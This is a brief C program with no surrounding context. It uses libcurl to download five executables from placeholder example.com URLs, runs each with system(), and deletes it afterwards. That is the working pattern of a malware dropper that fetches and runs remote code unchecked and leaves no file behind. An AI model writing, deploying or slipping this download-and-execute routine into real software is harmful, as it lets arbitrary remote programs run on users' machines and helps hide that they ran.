#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>

size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}

void download_and_execute(const char *url) {
    const char *fileName = "downloaded_program.exe";
    CURL *curl;
    FILE *fp;
    curl = curl_easy_init();
    if (curl) {
        fp = fopen(fileName, "wb");
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        fclose(fp);
    }
    system(fileName);
    remove(fileName);
}

int main() {
    download_and_execute("http://example.com/file1.exe");
    download_and_execute("http://example.com/file2.exe");
    download_and_execute("http://example.com/file3.exe");
    download_and_execute("http://example.com/file4.exe");
    download_and_execute("http://example.com/file5.exe");
    return 0;
}